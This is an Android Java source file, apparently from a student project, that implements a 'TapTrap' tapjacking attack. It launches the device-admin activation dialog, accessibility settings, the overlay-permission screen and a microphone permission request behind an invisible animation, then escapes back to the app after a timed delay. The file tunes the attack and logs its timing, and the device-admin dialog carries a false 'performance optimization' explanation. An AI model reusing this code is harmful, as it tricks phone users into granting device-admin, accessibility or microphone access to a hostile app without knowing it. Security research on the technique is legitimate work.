package com.example.inf2007_mad_j1847.test;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;

import androidx.activity.ComponentActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.inf2007_mad_j1847.test.AppDeviceAdminReceiver;
import com.example.inf2007_mad_j1847.R;

public class TapTrap {

    private final ComponentActivity activity;
    private final ComponentName adminComponent;
    private static final int MICROPHONE_PERMISSION_REQUEST_CODE = 2001;

    public TapTrap(ComponentActivity activity) {
        this.activity = activity;
        this.adminComponent = new ComponentName(activity, AppDeviceAdminReceiver.class);
    }


    public boolean isPermissionGranted(String permission) {
        int result = ContextCompat.checkSelfPermission(activity, permission);
        boolean granted = (result == PackageManager.PERMISSION_GRANTED);

        String simpleName = permission.substring(permission.lastIndexOf('.') + 1);
        Log.d("tapTrap", "Permission " + simpleName + ": " +
                (granted ? "✅ GRANTED" : "❌ DENIED"));

        return granted;
    }

    public void launchDeviceAdminTrap() {
        long startTime = System.currentTimeMillis();
        Log.d("TapTrap_TIMING", "========== ATTACK STARTED ==========");
        Log.d("TapTrap_TIMING", "Start time: " + startTime + "ms");

        // Intent to activate Device Admin
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for performance optimization");

        long beforeLaunch = System.currentTimeMillis();
        Log.d("TapTrap_TIMING", "Before startActivity: " + beforeLaunch +
                "ms (elapsed: " + (beforeLaunch - startTime) + "ms)");


        // 🔴 LAUNCH SYSTEM DIALOG
        activity.startActivity(intent);

        long afterLaunch = System.currentTimeMillis();
        Log.d("TapTrap_TIMING", "After startActivity: " + afterLaunch +
                "ms (elapsed: " + (afterLaunch - startTime) + "ms)");

        // 🔴 MAKE IT INVISIBLE
        activity.overridePendingTransition(R.anim.ani_scale, 0);

        long afterAnimation = System.currentTimeMillis();
        Log.d("TapTrap_TIMING", "After overridePendingTransition: " + afterAnimation +
                "ms (elapsed: " + (afterAnimation - startTime) + "ms)");


        // 🔴 ESCAPE BEFORE DIALOG BECOMES VISIBLE (2.8 seconds)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {

            long beforeEscape = System.currentTimeMillis();
            Log.d("TapTrap_TIMING", "=== ESCAPE PHASE ===");
            Log.d("TapTrap_TIMING", "Before escape: " + beforeEscape +
                    "ms (total elapsed: " + (beforeEscape - startTime) + "ms)");

            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();

            long afterEscape = System.currentTimeMillis();
            Log.d("TapTrap_TIMING", "After escape: " + afterEscape +
                    "ms (total elapsed: " + (afterEscape - startTime) + "ms)");
            Log.d("TapTrap_TIMING", "========== ATTACK COMPLETE ==========");
        }, 3500);


    }


    public void launchAccessibilityTrap() {
        // Intent to open Accessibility settings
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);

        // 🔴 LAUNCH SYSTEM SETTINGS
        activity.startActivity(intent);

        // 🔴 MAKE IT INVISIBLE
        activity.overridePendingTransition(R.anim.ani, 1);

        // 🔴 ESCAPE BEFORE SCREEN BECOMES VISIBLE (2.8 seconds)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 3000);
    }

    public void launchAppAccessibilityTrap() {
//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//        intent.setData(android.net.Uri.parse("package:" + activity.getPackageName()));
//        activity.startActivity(intent);

        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        activity.startActivity(intent);

        activity.overridePendingTransition(R.anim.ani, 1);

//        new Handler(Looper.getMainLooper()).postDelayed(() -> {
//            activity.startActivity(new Intent(activity, activity.getClass()));
//            activity.finish();
//        }, 2800);
    }


    public void launchAppAccessibilityTrap2() {
//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//        intent.setData(android.net.Uri.parse("package:" + activity.getPackageName()));
//        activity.startActivity(intent);

        Intent intent = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + activity.getPackageName())
        );
        activity.startActivity(intent);

        activity.overridePendingTransition(R.anim.ani, 1);

//        new Handler(Looper.getMainLooper()).postDelayed(() -> {
//            activity.startActivity(new Intent(activity, activity.getClass()));
//            activity.finish();
//        }, 2800);
    }



    public void testInvisiblePermission() {
        // Request permission
        ActivityCompat.requestPermissions(activity,
                new String[]{Manifest.permission.RECORD_AUDIO},
                MICROPHONE_PERMISSION_REQUEST_CODE);

        // 🔴 TRY TO MAKE IT INVISIBLE
        // Note: This may NOT work because permission dialogs are special
        activity.overridePendingTransition(R.anim.ani, R.anim.ani);

        // Escape after delay
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 2800);
        isPermissionGranted(Manifest.permission.RECORD_AUDIO);
    }



    public void testInvisible2() {
        try {
            Animation anim = AnimationUtils.loadAnimation(activity, R.anim.ani);

            Log.d("TapTrap", "===== ANIMATION VALUES =====");
            Log.d("TapTrap", "Duration: " + anim.getDuration() + "ms");
            Log.d("TapTrap", "FillAfter: " + anim.getFillAfter());
            Log.d("TapTrap", "StartTime: " + anim.getStartTime());
            Log.d("TapTrap", "StartOffset: " + anim.getStartOffset());
            Log.d("TapTrap", "RepeatMode: " + anim.getRepeatMode());
            Log.d("TapTrap", "RepeatCount: " + anim.getRepeatCount());

            // We can't get alpha values directly, but we can test the effect

        } catch (Exception e) {
            Log.e("TapTrap", "Error", e);
        }


        int animId = R.anim.ani;
        Log.d("TapTrap", "Animation resource ID: " + animId);

        // This will throw exception if resource doesn't exist
        activity.getResources().getAnimation(animId);
        Log.d("TapTrap", "✅ Animation resource loaded successfully");

        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);



        // 🔴 LAUNCH ACTIVITY
        activity.startActivity(intent);
        //activity.overridePendingTransition(0, 0);
        //activity.overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
        // 🔴 MAKE IT INVISIBLE - THIS WORKS!
        activity.overridePendingTransition(R.anim.ani, 1);


        // Escape after delay
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 4000);
    }





}